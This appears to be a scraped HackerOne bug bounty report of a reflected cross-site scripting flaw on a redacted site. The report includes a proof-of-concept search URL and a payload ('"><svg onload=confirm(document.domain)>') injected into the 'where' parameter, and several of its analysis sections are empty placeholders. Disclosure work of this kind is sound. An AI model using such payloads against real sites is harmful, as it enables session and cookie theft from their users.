# Cross-site Scripting (XSS) - Reflected at https://██████████/

## Metadata
- **Source:** HackerOne
- **Report:** 1370746 | https://hackerone.com/reports/1370746
- **Submitted:** 2021-10-15
- **Reporter:** mamunwhh
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Hello Team,
i just found a reflected xss bug on your web https://█████

Step To reproduce:
 poc url: https://████/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E

## Impact

Impact
Data can be stolen, or Javascript can be executed.This is will allow the attacker to steal users cookies

## System Host(s)
██████████

## Affected Product(s) and Ve

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello Team,
i just found a reflected xss bug on your web https://█████

Step To reproduce:
 poc url: https://████/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E

## Impact

Impact
Data can be stolen, or Javascript can be executed.This is will allow the attacker to steal users cookies

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. go to parameter  https://█████████/7/0/33/1d/www.citysearch.com/search?what=x&where=
2. enter "><svg+onload=confirm(document.domain)>

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
